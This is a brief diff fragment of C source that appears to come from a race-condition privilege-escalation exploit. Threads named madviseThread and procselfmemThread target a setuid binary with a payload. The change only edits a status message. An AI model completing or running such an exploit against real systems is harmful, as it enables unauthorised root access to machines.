@@ -119,7 +119,7 @@ int main(int argc,char *argv[]) {
 
     map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
 
-    printf("Racing, this may take a while..\n");
+    printf("[...] Racing, this may take a while..\n");
 
     pthread_create(&pth1, NULL, &madviseThread, suid_binary);
     pthread_create(&pth2, NULL, &procselfmemThread, payload);
